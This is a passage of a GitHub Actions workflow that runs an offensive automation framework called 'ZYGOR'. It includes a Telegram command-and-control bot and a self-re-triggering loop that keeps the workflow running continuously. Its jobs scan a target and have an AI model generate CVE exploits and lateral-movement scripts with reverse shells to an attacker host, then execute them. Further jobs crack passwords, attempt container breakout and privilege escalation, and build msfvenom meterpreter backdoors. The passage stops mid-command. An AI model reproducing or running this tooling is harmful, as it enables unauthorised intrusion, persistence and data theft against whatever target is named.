              await update.message.reply_text("🦠 Generating persistent backdoor...")
              # Generate msfvenom payload
              result = await run_shell(
                  f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o /tmp/zygor_backdoor.elf 2>&1 || "
                  f"echo 'msfvenom not available, using AI-generated backdoor'", 30)
              await update.message.reply_text(f"*Backdoor Generation:*\n```\n{result}\n```", parse_mode='Markdown')
              try:
                  with open("/tmp/zygor_backdoor.elf", 'rb') as f:
                      await update.message.reply_document(f, caption="🦠 ZYGOR Backdoor ELF")
              except:
                  pass

          # ── Error Handler ──────────────────────────────────────────────────────────────────────
          async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
              logger.error(f"Update {update} caused error {context.error}")
              try:
                  await update.message.reply_text(f"⚠️ Error: {str(context.error)[:200]}")
              except:
                  pass

          # ── Main Entry Point ──────────────────────────────────────────────────────────────────
          def main():
              if not TOKEN:
                  logger.error("No TELEGRAM_BOT_TOKEN provided")
                  return

              app = Application.builder().token(TOKEN).build()

              # Register handlers
              app.add_handler(CommandHandler("start", cmd_start))
              app.add_handler(CommandHandler("help", cmd_help))
              app.add_handler(CommandHandler("status", cmd_status))
              app.add_handler(CommandHandler("scan", cmd_scan))
              app.add_handler(CommandHandler("recon", cmd_recon))
              app.add_handler(CommandHandler("exploit", cmd_exploit))
              app.add_handler(CommandHandler("webforge", cmd_webforge))
              app.add_handler(CommandHandler("exec", cmd_exec))
              app.add_handler(CommandHandler("ai", cmd_ai))
              app.add_handler(CommandHandler("abort", cmd_abort))
              app.add_handler(CommandHandler("settarget", cmd_settarget))
              app.add_handler(CommandHandler("setlhost", cmd_setlhost))
              app.add_handler(CommandHandler("setlport", cmd_setlport))
              app.add_handler(CommandHandler("enableexfil", cmd_enableexfil))
              app.add_handler(CommandHandler("disableexfil", cmd_disableexfil))
              app.add_handler(CommandHandler("backup", cmd_backup))
              app.add_handler(CommandHandler("report", cmd_report))
              app.add_handler(CommandHandler("dashboard", cmd_dashboard))
              app.add_handler(CommandHandler("social", cmd_social))
              app.add_handler(CommandHandler("ctf", cmd_ctf))
              app.add_handler(CommandHandler("spawn", cmd_spawn))
              app.add_handler(CommandHandler("takeover", cmd_takeover))
              app.add_handler(CommandHandler("obfuscate", cmd_obfuscate))
              app.add_handler(CommandHandler("shellcode", cmd_shellcode))
              app.add_handler(CommandHandler("ddns", cmd_ddns))
              app.add_handler(CommandHandler("notify", cmd_notify))
              app.add_handler(CommandHandler("enum", cmd_enum))
              app.add_handler(CommandHandler("sqli", cmd_sqli))
              app.add_handler(CommandHandler("xss", cmd_xss))
              app.add_handler(CommandHandler("crack", cmd_crack))
              app.add_handler(CommandHandler("privesc", cmd_privesc))
              app.add_handler(CommandHandler("pth", cmd_pth))
              app.add_handler(CommandHandler("backdoor", cmd_backdoor_cmd))

              # Register error handler
              app.add_error_handler(error_handler)

              logger.info("🤖 ZYGOR Telegram Bot starting polling...")
              print("🤖 ZYGOR Telegram Bot started. Awaiting commands...")

              # Start polling (blocking call)
              app.run_polling(allowed_updates=Update.ALL_TYPES)

          if __name__ == '__main__':
              main()
          PYEOF

          chmod +x /opt/zygor/bin/telegram_controller.py
          echo "✓ Telegram controller script built"

          # Launch the bot in background
          nohup python3 /opt/zygor/bin/telegram_controller.py > /var/log/zygor/telegram_bot.log 2>&1 &
          echo "✓ Telegram bot launched in background (PID: $!)"

      # ── Step 1.23: Infinite self-re-trigger mechanism ──────────────────────────────────────────
      # This ensures the workflow never stops. It dispatches a new workflow run approximately
      # 30 minutes before the 6-hour timeout, providing seamless continuous operation.
      - name: '∞ Self-re-trigger mechanism (24/7 operation)'
        shell: bash
        run: |
          # Calculate sleep time: (MAX_HOURS * 3600) - 1800 (30 min before timeout)
          MAX_SECONDS=$(( ${MAX_HOURS:-6} * 3600 ))
          SLEEP_TIME=$(( MAX_SECONDS - 1800 ))
          if [ $SLEEP_TIME -lt 300 ]; then
            SLEEP_TIME=300  # Minimum 5 min
          fi

          echo "⏰ Will re-trigger workflow after ${SLEEP_TIME}s (${MAX_HOURS}h - 30min)"

          # Spawn background task that waits and dispatches
          (
            sleep $SLEEP_TIME
            echo "🔄 Re-triggering ZYGOR workflow..."

            # Build dispatch payload
            PAYLOAD=$(jq -n \
              --arg target "${TARGET}" \
              --arg lhost "${LHOST}" \
              --arg lport "${LPORT}" \
              --arg ai_model "${AI_MODEL}" \
              --arg phase "${PHASE}" \
              --arg exfil "${ENABLE_EXFIL}" \
              --arg hours "${MAX_HOURS}" \
              --arg chat_ops "${CHAT_OPS}" \
              --arg issue "${CHAT_ISSUE}" \
              --arg backup "${BACKUP_PROVIDER}" \
              --arg telegram "${TELEGRAM_ENABLE}" \
              --arg telegram_id "${TELEGRAM_CHAT_ID}" \
              '{
                ref: "main",
                inputs: {
                  target: $target,
                  lhost: $lhost,
                  lport: $lport,
                  ai_model: $ai_model,
                  penetration_phase: $phase,
                  enable_exfiltration: $exfil,
                  run_duration_hours: $hours,
                  enable_chat_ops: $chat_ops,
                  chat_issue_number: $issue,
                  backup_provider: $backup,
                  telegram_enable: $telegram,
                  telegram_chat_id: $telegram_id
                }
              }')

            # Dispatch the new run
            curl -s -X POST \
              -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
              -H "Accept: application/vnd.github.v3+json" \
              -H "Content-Type: application/json" \
              -d "$PAYLOAD" \
              "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/workflows/zygor-supreme.yml/dispatches"

            echo "✅ Re-trigger dispatched"
          ) & disown

          echo "✓ Self-re-trigger armed"

      # ── Step 1.24: Send startup notification ──────────────────────────────────────────────────
      - name: '🔔 Send startup notification'
        shell: bash
        run: |
          STARTUP_MSG="🚀 *ZYGOR v4.0 Started*\n🎯 Target: \`${TARGET}\`\n🧠 Model: \`${AI_MODEL}\`\n⚡ Phase: \`${PHASE}\`\n🔒 Exfil: \`${ENABLE_EXFIL}\`\n⏱ Timeout: \`${MAX_HOURS}h\`\n🆔 Run: \`${GITHUB_RUN_ID}\`"

          # Notify Discord
          if [ -n "$DISCORD_WEBHOOK" ]; then
            python3 /opt/zygor/bin/notify.py discord "$STARTUP_MSG" "$DISCORD_WEBHOOK" 2>/dev/null || true
          fi

          # Notify Slack
          if [ -n "$SLACK_WEBHOOK" ]; then
            python3 /opt/zygor/bin/notify.py slack "$STARTUP_MSG" "$SLACK_WEBHOOK" 2>/dev/null || true
          fi

          echo "✓ Startup notifications sent"

  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  # JOB 2: 🛡️ INFINITE ABORT WATCHDOG – Listens for abort commands and cancels the workflow
  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  abort_watchdog:
    name: '🛡️ Abort Watchdog (GitHub Issues + Telegram)'
    needs: [bootstrap]
    runs-on: ${{ secrets.RUNNER_LABELS || 'ubuntu-latest' }}
    timeout-minutes: 360
    # FIX: Use contextual expression properly. `always()` ensures this runs even on failure.
    # We check that GITHUB_TOKEN_ABORT is not empty using the env context (safe here).
    if: always() && env.GITHUB_TOKEN_ABORT != ''
    steps:
      - name: '🔍 Monitor for abort commands'
        shell: bash
        run: |
          echo "🛡️ Abort Watchdog active for run ${GITHUB_RUN_ID}"
          echo "Monitoring GitHub Issues and activity for abort signals..."

          while true; do
            # Check GitHub Issues comments for /abort
            if [ -n "${GITHUB_TOKEN_ABORT}" ]; then
              COMMENTS=$(curl -s \
                -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
                -H "Accept: application/vnd.github.v3+json" \
                "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${CHAT_ISSUE}/comments?per_page=5&sort=updated" 2>/dev/null)

              if echo "$COMMENTS" | jq -r '.[] | .body' | grep -qi '/abort'; then
                echo "🛑 ABORT signal received from GitHub Issues!"
                curl -s -X POST \
                  -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
                  -H "Accept: application/vnd.github.v3+json" \
                  "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/cancel" 2>/dev/null
                echo "✅ Workflow cancellation requested"
                exit 0
              fi

              # Also check workflow_run comments
              RUN_COMMENTS=$(curl -s \
                -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
                -H "Accept: application/vnd.github.v3+json" \
                "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/jobs" 2>/dev/null)

              # Log status periodically
              echo "⏳ Watchdog heartbeat - $(date -u)"
            fi

            sleep 30
          done

  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  # JOB 3: 📡 RECONNAISSANCE – Parallel scanning modules via matrix strategy
  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  # FIX: For job-level `if`, we use `inputs.penetration_phase` directly (the `inputs` context is
  # available for workflow_dispatch events). For `schedule` events, `inputs` is empty, so we check
  # `github.event_name == 'schedule'` as a fallback. This is the CORRECT way to handle this in
  # GitHub Actions – NOT using `env.PHASE` which causes parsing errors.

  reconnaissance:
    name: '🔍 Phase 1 – Reconnaissance'
    needs: [bootstrap]
    runs-on: ${{ secrets.RUNNER_LABELS || 'ubuntu-latest' }}
    timeout-minutes: 360
    if: |
      github.event_name == 'schedule' ||
      inputs.penetration_phase == 'recon' ||
      inputs.penetration_phase == 'full'
    strategy:
      fail-fast: false
      matrix:
        module:
          - network_scan
          - web_discovery
          - ad_enum
          - wireless_survey
          - osint_gather
    steps:
      - name: '📥 Checkout repository'
        uses: actions/checkout@v4

      - name: '🔧 Set up AI tooling'
        shell: bash
        run: |
          export PATH="/opt/zygor/bin:$PATH"
          echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV

      # ── Network Scanning module ──────────────────────────────────────────────────────────────
      - name: '📡 Network Scan (nmap + masscan + arp-scan)'
        if: matrix.module == 'network_scan'
        shell: bash
        run: |
          echo "::group::Network Scan - $TARGET"
          mkdir -p /tmp/recon

          # Full port scan with service detection
          echo "Running Nmap comprehensive scan..."
          nmap -T4 -A -p- --script vuln,exploit,discovery,default \
            -oA /tmp/recon/nmap_full $TARGET 2>/dev/null || true

          # Quick masscan for top ports
          echo "Running Masscan..."
          masscan $TARGET --ports=1-65535 --rate=10000 \
            -oX /tmp/recon/masscan.xml 2>/dev/null || true

          # ARP scan for local network
          echo "Running ARP scan..."
          sudo arp-scan --localnet --retry=3 \
            > /tmp/recon/arp_scan.txt 2>/dev/null || true

          # AI analysis of results
          echo "Running AI analysis..."
          if [ -f /tmp/recon/nmap_full.xml ]; then
            cat /tmp/recon/nmap_full.xml | ai_complete 2048 \
              "Analyze these Nmap scan results. List all open ports, running services, versions, and potential CVEs. Format as a structured report." \
              > /tmp/recon/ai_analysis.txt 2>/dev/null || true
          fi

          # Extract service info
          grep -oP '\d+/tcp\s+open\s+\S+' /tmp/recon/nmap_full.nmap 2>/dev/null \
            > /tmp/recon/open_ports.txt || true

          echo "::endgroup::"

      # ── Web Discovery module ─────────────────────────────────────────────────────────────────
      - name: '🌐 Web Discovery (ffuf + subfinder + whatweb)'
        if: matrix.module == 'web_discovery'
        shell: bash
        run: |
          echo "::group::Web Discovery - $TARGET"

          # Subdomain enumeration
          echo "Enumerating subdomains..."
          subfinder -d $TARGET -o /tmp/recon/subdomains.txt 2>/dev/null || true
          amass enum -d $TARGET -o /tmp/recon/amass_subdomains.txt 2>/dev/null || true

          # Web technology detection
          echo "Detecting web technologies..."
          whatweb $TARGET -a 3 --log-json=/tmp/recon/whatweb.json 2>/dev/null || true
          whatweb $TARGET > /tmp/recon/whatweb.txt 2>/dev/null || true

          # Directory fuzzing with default wordlist
          echo "Running ffuf directory enumeration..."
          ffuf -u http://${TARGET}/FUZZ \
            -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
            -o /tmp/recon/ffuf_default.json -of json \
            -t 50 -c -rate 100 2>/dev/null || true

          # AI-generated custom wordlist
          echo "Generating AI wordlist..."
          if [ -f /tmp/recon/whatweb.txt ]; then
            cat /tmp/recon/whatweb.txt | ai_complete 1024 \
              "Generate a custom web fuzzing wordlist based on the technology stack above. Output one word per line." \
              > /tmp/recon/ai_wordlist.txt 2>/dev/null || true
          fi

          # Fuzz with AI wordlist
          if [ -s /tmp/recon/ai_wordlist.txt ]; then
            ffuf -u http://${TARGET}/FUZZ \
              -w /tmp/recon/ai_wordlist.txt \
              -o /tmp/recon/ffuf_ai.json -of json \
              -t 50 -c 2>/dev/null || true
          fi

          # Nuclei web scan
          echo "Running Nuclei web scan..."
          nuclei -u http://${TARGET} -severity critical,high,medium \
            -o /tmp/recon/nuclei_web.txt 2>/dev/null || true

          # WAF detection
          echo "Detecting WAF..."
          wafw00f http://${TARGET} -o /tmp/recon/waf_info.txt 2>/dev/null || true

          echo "::endgroup::"

      # ── AD/LDAP Enumeration module ──────────────────────────────────────────────────────────
      - name: '🏢 AD/LDAP Enumeration'
        if: matrix.module == 'ad_enum'
        shell: bash
        run: |
          echo "::group::AD/LDAP Enumeration - $TARGET"

          # Basic LDAP query
          echo "Querying LDAP..."
          ldapsearch -x -h $TARGET -p 389 -s base -b "" \
            > /tmp/recon/ldap_base.txt 2>/dev/null || echo "LDAP port 389 not accessible"

          ldapsearch -x -h $TARGET -p 636 -s base -b "" -Z \
            > /tmp/recon/ldaps_base.txt 2>/dev/null || echo "LDAPS port 636 not accessible"

          # BloodHound enumeration
          echo "Running BloodHound..."
          bloodhound-python -d $TARGET -u guest -p '' \
            -ns $TARGET -c all --zip \
            -o /tmp/recon/bloodhound 2>/dev/null || true

          # Kerberos enumeration
          echo "Checking Kerberos..."
          echo -e "${TARGET}\n88" | nc -w 3 $TARGET 88 2>/dev/null \
            && echo "Kerberos port 88 open" \
            > /tmp/recon/kerberos_check.txt || true

          # SMB enumeration
          echo "Enumerating SMB..."
          smbclient -L //$TARGET -N \
            > /tmp/recon/smb_shares.txt 2>/dev/null || true

          # AI analysis
          cat /tmp/recon/ldap_base.txt 2>/dev/null | ai_complete 1024 \
            "Analyze this LDAP information and identify potential AD attack vectors." \
            > /tmp/recon/ad_ai_analysis.txt 2>/dev/null || true

          echo "::endgroup::"

      # ── Wireless Survey module ──────────────────────────────────────────────────────────────
      - name: '📶 Wireless Survey'
        if: matrix.module == 'wireless_survey'
        shell: bash
        run: |
          echo "::group::Wireless Survey"

          # Check for wireless interfaces
          INTERFACES=$(iw dev 2>/dev/null | awk '/Interface/{print $2}')
          if [ -z "$INTERFACES" ]; then
            echo "⚠️ No wireless interfaces found"
            echo "No wireless hardware available" > /tmp/recon/wireless_status.txt
          else
            echo "Found wireless interfaces: $INTERFACES"

            for IFACE in $INTERFACES; do
              echo "Surveying $IFACE..."

              # Get interface info
              iw dev $IFACE info > /tmp/recon/${IFACE}_info.txt 2>/dev/null || true

              # Scan for networks
              sudo iw dev $IFACE scan \
                > /tmp/recon/${IFACE}_scan.txt 2>/dev/null || true

              # Monitor mode
              sudo ip link set $IFACE down 2>/dev/null
              sudo iw dev $IFACE set type monitor 2>/dev/null
              sudo ip link set $IFACE up 2>/dev/null

              # Brief capture
              timeout 10 sudo tcpdump -i $IFACE -c 100 -w /tmp/recon/${IFACE}_capture.pcap 2>/dev/null || true

              # Restore managed mode
              sudo ip link set $IFACE down 2>/dev/null
              sudo iw dev $IFACE set type managed 2>/dev/null
              sudo ip link set $IFACE up 2>/dev/null
            done
          fi

          echo "::endgroup::"

      # ── OSINT Gathering module ──────────────────────────────────────────────────────────────
      - name: '🕵️ OSINT Gathering'
        if: matrix.module == 'osint_gather'
        shell: bash
        env:
          SHODAN_API_KEY: ${{ secrets.SHODAN_API_KEY }}
          CENSYS_API_ID: ${{ secrets.CENSYS_API_ID }}
          CENSYS_API_SECRET: ${{ secrets.CENSYS_API_SECRET }}
        run: |
          echo "::group::OSINT Gathering - $TARGET"

          # DNS enumeration
          echo "DNS enumeration..."
          dig any $TARGET > /tmp/recon/dns_records.txt 2>/dev/null || true
          nslookup -type=any $TARGET >> /tmp/recon/dns_records.txt 2>/dev/null || true
          dnsx -d $TARGET -a -aaaa -cname -ns -mx -soa -txt \
            -o /tmp/recon/dnsx_records.txt 2>/dev/null || true

          # Shodan (if API key available)
          if [ -n "$SHODAN_API_KEY" ]; then
            echo "Querying Shodan..."
            shodan search "hostname:$TARGET" --fields ip_str,port,org,hostnames,data \
              > /tmp/recon/shodan_results.txt 2>/dev/null || true
            shodan host $TARGET \
              >> /tmp/recon/shodan_results.txt 2>/dev/null || true
          fi

          # Censys (if API keys available)
          if [ -n "$CENSYS_API_ID" ] && [ -n "$CENSYS_API_SECRET" ]; then
            echo "Querying Censys..."
            python3 -c "
            import json, urllib.request, base64
            auth = base64.b64encode(f'${CENSYS_API_ID}:${CENSYS_API_SECRET}'.encode()).decode()
            req = urllib.request.Request('https://search.censys.io/api/v2/hosts/${TARGET}')
            req.add_header('Authorization', f'Basic {auth}')
            try:
                with urllib.request.urlopen(req, timeout=30) as resp:
                    data = json.loads(resp.read())
                    with open('/tmp/recon/censys_results.json', 'w') as f:
                        json.dump(data, f, indent=2)
                    print('Censys data saved')
            except Exception as e:
                print(f'Censys error: {e}')
            " 2>/dev/null || true
          fi

          # WHOIS lookup
          echo "WHOIS lookup..."
          whois $TARGET > /tmp/recon/whois_data.txt 2>/dev/null || true

          # Certificate transparency
          echo "Certificate Transparency..."
          curl -s "https://crt.sh/?q=%25.${TARGET}&output=json" \
            > /tmp/recon/cert_transparency.json 2>/dev/null || true

          # AI-powered OSINT analysis
          echo "AI OSINT analysis..."
          cat /tmp/recon/dns_records.txt /tmp/recon/whois_data.txt 2>/dev/null | \
            ai_complete 2048 \
            "Perform OSINT analysis on this target information. Identify emails, subdomains, technologies, and potential attack surfaces." \
            > /tmp/recon/ai_osint_analysis.txt 2>/dev/null || true

          echo "::endgroup::"

      # ── Upload recon artifacts ───────────────────────────────────────────────────────────────
      - name: '📤 Upload recon artifacts'
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: recon-${{ matrix.module }}-${{ github.run_id }}
          path: |
            /tmp/recon/*.txt
            /tmp/recon/*.xml
            /tmp/recon/*.json
            /tmp/recon/*.nmap
            /tmp/recon/*.gnmap
            /tmp/recon/*.pcap
            /tmp/recon/*.zip
            /tmp/recon/*.csv
          if-no-files-found: warn

  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  # JOB 4: 💥 EXPLOITATION – Parallel attack vectors via matrix strategy
  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  exploitation:
    name: '💥 Phase 2 – Exploitation'
    needs: [bootstrap, reconnaissance]
    runs-on: ${{ secrets.RUNNER_LABELS || 'ubuntu-latest' }}
    timeout-minutes: 360
    if: |
      github.event_name == 'schedule' ||
      inputs.penetration_phase == 'exploitation' ||
      inputs.penetration_phase == 'full'
    strategy:
      max-parallel: 4
      fail-fast: false
      matrix:
        attack:
          - ai_exploit_gen
          - metasploit_rc
          - web_sqli_xss
          - password_cracking
          - container_breakout
          - privilege_escalation
          - lateral_movement
          - backdoor_creation
    steps:
      - name: '📥 Checkout'
        uses: actions/checkout@v4

      - name: '🔧 Set up AI tooling'
        shell: bash
        run: |
          export PATH="/opt/zygor/bin:$PATH"
          echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
          mkdir -p /tmp/exploit_output

      # ── AI Exploit Generation ───────────────────────────────────────────────────────────────
      - name: '🧬 AI Exploit Generation'
        if: matrix.attack == 'ai_exploit_gen'
        shell: bash
        run: |
          echo "::group::AI Exploit Generation"
          echo "Generating AI-powered exploits for $TARGET..."

          # Get service info from recon
          SERVICE_INFO=""
          if [ -f /tmp/recon/open_ports.txt ]; then
            SERVICE_INFO=$(cat /tmp/recon/open_ports.txt 2>/dev/null)
          fi
          if [ -f /tmp/recon/ai_analysis.txt ]; then
            SERVICE_INFO="$SERVICE_INFO\n$(cat /tmp/recon/ai_analysis.txt 2>/dev/null)"
          fi
          if [ -f /tmp/recon/nuclei_web.txt ]; then
            SERVICE_INFO="$SERVICE_INFO\n$(cat /tmp/recon/nuclei_web.txt 2>/dev/null)"
          fi

          # Extract CVE information
          CVES=$(echo "$SERVICE_INFO" | grep -oP 'CVE-\d{4}-\d+' | sort -u)
          echo "Found CVEs: $CVES"

          for CVE in $CVES; do
            echo "Generating exploit for $CVE..."

            # AI generates exploit
            PROMPT="Write a Python3 exploit script for $CVE targeting $TARGET. Include a reverse shell to $LHOST:$LPORT. Output ONLY the Python code, no explanations. Make it functional with proper error handling."
            ai_complete 4096 <<< "$PROMPT" > /tmp/exploit_output/exploit_${CVE}.py 2>/dev/null || true

            if [ -s /tmp/exploit_output/exploit_${CVE}.py ]; then
              chmod +x /tmp/exploit_output/exploit_${CVE}.py
              echo "✓ Exploit generated for $CVE"

              # Execute if exfil is enabled
              if [ "${ENABLE_EXFIL}" = "true" ]; then
                echo "Executing exploit $CVE..."
                timeout 60 python3 /tmp/exploit_output/exploit_${CVE}.py \
                  > /tmp/exploit_output/${CVE}_result.txt 2>&1 || true
              fi
            fi
          done

          # Generate additional exploits using nuclei findings
          if [ -f /tmp/recon/nuclei_web.txt ]; then
            NUCLEI_FINDINGS=$(cat /tmp/recon/nuclei_web.txt | head -20)
            PROMPT="Based on these vulnerability findings:\n$NUCLEI_FINDINGS\n\nGenerate a Metasploit resource script (.rc) to exploit the critical findings. Output ONLY the resource script content."
            ai_complete 4096 <<< "$PROMPT" > /tmp/exploit_output/nuclei_exploits.rc 2>/dev/null || true
          fi

          echo "::endgroup::"

      # ── Metasploit Automation ────────────────────────────────────────────────────────────────
      - name: '⚡ Metasploit Resource Scripts'
        if: matrix.attack == 'metasploit_rc'
        shell: bash
        run: |
          echo "::group::Metasploit Automation"

          # Generate MSF resource script using AI
          NSE_OUTPUT=""
          if [ -f /tmp/recon/nmap_full.nmap ]; then
            NSE_OUTPUT=$(head -c 3000 /tmp/recon/nmap_full.nmap)
          fi

          PROMPT="Generate a comprehensive Metasploit resource script (.rc) for target $TARGET. Include:
          1. Database setup
          2. Import Nmap results
          3. Service-specific exploitation modules (try multiple)
          4. Post-exploitation modules
          5. Persistence mechanisms

          Services detected:\n$NSE_OUTPUT\n
          Output ONLY the .rc script content, no explanations."

          ai_complete 8192 <<< "$PROMPT" > /tmp/exploit_output/msf_auto.rc 2>/dev/null || true

          if [ -s /tmp/exploit_output/msf_auto.rc ]; then
            echo "Running Metasploit resource script..."
            timeout 300 msfconsole -q -r /tmp/exploit_output/msf_auto.rc \
              > /tmp/exploit_output/msf_output.txt 2>&1 || true

            cat /tmp/exploit_output/msf_output.txt 2>/dev/null | tail -100 || true
          fi

          echo "::endgroup::"

      # ── Web Application Attacks ─────────────────────────────────────────────────────────────
      - name: '💉 Web App Attacks (SQLi + XSS)'
        if: matrix.attack == 'web_sqli_xss'
        shell: bash
        run: |
          echo "::group::Web Application Attacks"

          # Get discovered URLs
          URLS=""
          if [ -f /tmp/recon/ffuf_default.json ]; then
            URLS=$(jq -r '.results[] | select(.status == 200) | .url' /tmp/recon/ffuf_default.json 2>/dev/null | head -20)
          fi

          # SQL injection scan on discovered URLs
          for URL in $URLS; do
            echo "Scanning $URL for SQLi..."
            if [[ "$URL" == *"="* ]]; then
              timeout 120 sqlmap -u "$URL" --batch --risk=3 --level=5 \
                --random-agent --output-dir=/tmp/exploit_output/sqlmap \
                --max-time=60 --threads=4 2>/dev/null || true
            fi
          done

          # SQLmap on main target
          timeout 180 sqlmap -u "http://${TARGET}" --batch --forms --crawl=3 \
            --random-agent --output-dir=/tmp/exploit_output/sqlmap_main \
            --max-time=60 2>/dev/null || true

          # XSS scanning
          for URL in $URLS; do
            echo "Scanning $URL for XSS..."
            timeout 60 xsser --url "$URL" --auto \
              --output /tmp/exploit_output/xss_results.txt 2>/dev/null || true
          done

          echo "::endgroup::"

      # ── Password Cracking ───────────────────────────────────────────────────────────────────
      - name: '🔑 Password Cracking'
        if: matrix.attack == 'password_cracking'
        shell: bash
        run: |
          echo "::group::Password Cracking"

          # AI generates optimized cracking rules
          PROMPT="Generate optimized John the Ripper or hashcat rules for password cracking.
          Target context: $TARGET
          Include rules for: leet speak substitutions, common patterns, company name mutations, year suffixes, special character appending.
          Output format: One rule per line, compatible with John the Ripper syntax."

          ai_complete 2048 <<< "$PROMPT" > /tmp/exploit_output/ai_crack_rules.conf 2>/dev/null || true

          # Create sample hash file (from any captured data)
          cat > /tmp/exploit_output/hashes.txt << 'EOF'
          admin:$1$abcdefgh$1234567890abcdef1234567890abcdef
          root:$6$abcdefgh$1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12
          user:$2y$10$abcdefghijklmnopqrstuv0123456789abcdefghijklmnopqrstuv
          EOF

          # Attempt cracking
          if [ -s /tmp/exploit_output/ai_crack_rules.conf ]; then
            timeout 120 john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt \
              --rules=/tmp/exploit_output/ai_crack_rules.conf \
              /tmp/exploit_output/hashes.txt \
              > /tmp/exploit_output/john_output.txt 2>&1 || true
            john --show /tmp/exploit_output/hashes.txt \
              > /tmp/exploit_output/cracked_passwords.txt 2>/dev/null || true
          fi

          echo "::endgroup::"

      # ── Container Breakout ──────────────────────────────────────────────────────────────────
      - name: '📦 Container Breakout'
        if: matrix.attack == 'container_breakout'
        shell: bash
        run: |
          echo "::group::Container Breakout Assessment"

          # Check if running in container
          if [ -f /.dockerenv ] || grep -q 'docker\|lxc\|containerd' /proc/1/cgroup 2>/dev/null; then
            echo "⚠️ Running inside a container! Attempting breakout..."

            # Gather container info
            cat /proc/1/cgroup > /tmp/exploit_output/container_cgroup.txt 2>/dev/null || true
            ls -la /var/run/docker.sock 2>/dev/null && echo "Docker socket available!" \
              > /tmp/exploit_output/docker_sock_found.txt || true
            cat /proc/1/environ | tr '\0' '\n' > /tmp/exploit_output/container_env.txt 2>/dev/null || true
            mount > /tmp/exploit_output/container_mounts.txt 2>/dev/null || true

            # AI generates breakout commands
            CONTAINER_INFO=$(cat /tmp/exploit_output/container_cgroup.txt /tmp/exploit_output/container_mounts.txt 2>/dev/null)
            PROMPT="Based on this container information:\n$CONTAINER_INFO\nGenerate a container breakout script. Include: host filesystem access, cgroup escape, Docker socket abuse, namespace escape. Output bash script only."
            ai_complete 4096 <<< "$PROMPT" > /tmp/exploit_output/container_breakout.sh 2>/dev/null || true

            chmod +x /tmp/exploit_output/container_breakout.sh

            if [ "${ENABLE_EXFIL}" = "true" ]; then
              echo "Attempting container breakout..."
              bash /tmp/exploit_output/container_breakout.sh \
                > /tmp/exploit_output/breakout_result.txt 2>&1 || true
            fi
          else
            echo "✓ Not running inside a container (bare metal or VM)"
            uname -a > /tmp/exploit_output/host_system.txt
          fi

          echo "::endgroup::"

      # ── Privilege Escalation ────────────────────────────────────────────────────────────────
      - name: '⬆️ Privilege Escalation'
        if: matrix.attack == 'privilege_escalation'
        shell: bash
        run: |
          echo "::group::Privilege Escalation"

          # Gather system info
          uname -a > /tmp/exploit_output/system_info.txt
          id >> /tmp/exploit_output/system_info.txt
          cat /proc/version >> /tmp/exploit_output/system_info.txt 2>/dev/null || true
          cat /etc/os-release >> /tmp/exploit_output/system_info.txt 2>/dev/null || true
          ls -la /etc/shadow 2>/dev/null >> /tmp/exploit_output/system_info.txt || true
          find / -perm -4000 -type f 2>/dev/null | head -30 > /tmp/exploit_output/suid_binaries.txt
          cat /etc/sudoers 2>/dev/null | head -50 > /tmp/exploit_output/sudoers.txt || true
          cat /etc/crontab 2>/dev/null > /tmp/exploit_output/crontab.txt || true
          ls -la /etc/cron* 2>/dev/null > /tmp/exploit_output/cron_jobs.txt || true
          dpkg -l 2>/dev/null | head -100 > /tmp/exploit_output/installed_packages.txt || true

          SYSINFO=$(cat /tmp/exploit_output/system_info.txt /tmp/exploit_output/suid_binaries.txt 2>/dev/null)

          # AI generates privesc exploits
          PROMPT="Based on this Linux system information:\n$SYSINFO\nIdentify privilege escalation vectors. For each vector, provide: exploit type, exact commands, and expected result. Include kernel exploits, SUID binaries, misconfigurations, cron jobs, and capabilities."
          ai_complete 8192 <<< "$PROMPT" > /tmp/exploit_output/ai_privesc_commands.sh 2>/dev/null || true

          chmod +x /tmp/exploit_output/ai_privesc_commands.sh 2>/dev/null || true

          if [ "${ENABLE_EXFIL}" = "true" ]; then
            echo "Attempting privilege escalation..."
            bash /tmp/exploit_output/ai_privesc_commands.sh \
              > /tmp/exploit_output/privesc_result.txt 2>&1 || true
          fi

          echo "::endgroup::"

      # ── Lateral Movement ────────────────────────────────────────────────────────────────────
      - name: '🔄 Lateral Movement'
        if: matrix.attack == 'lateral_movement'
        shell: bash
        run: |
          echo "::group::Lateral Movement"

          # AI generates lateral movement script
          PROMPT="Generate a Python script using Impacket for lateral movement to target $TARGET. Use pass-the-hash, PSExec, WMI, or DCOM techniques. Include a reverse shell to $LHOST:$LPORT. Output ONLY the Python code."
          ai_complete 4096 <<< "$PROMPT" > /tmp/exploit_output/lateral_move.py 2>/dev/null || true

          chmod +x /tmp/exploit_output/lateral_move.py

          # Run if exfil enabled
          if [ "${ENABLE_EXFIL}" = "true" ]; then
            echo "Executing lateral movement..."
            timeout 60 python3 /tmp/exploit_output/lateral_move.py \
              > /tmp/exploit_output/lateral_result.txt 2>&1 || true
          fi

          echo "::endgroup::"

      # ── Backdoor Creation ───────────────────────────────────────────────────────────────────
      - name: '🦠 Backdoor & Persistence'
        if: matrix.attack == 'backdoor_creation'
        shell: bash
        run: |
          echo "::group::Backdoor Creation"

          # Generate msfvenom payload
          echo "Generating meterpreter payload..."
          msfvenom -p linux/x64/meterpreter/reverse_tcp \
            LHOST=$LHOST LPORT=$LPORT \
            -f elf -o /tmp/exploit_output/backdoor.elf \
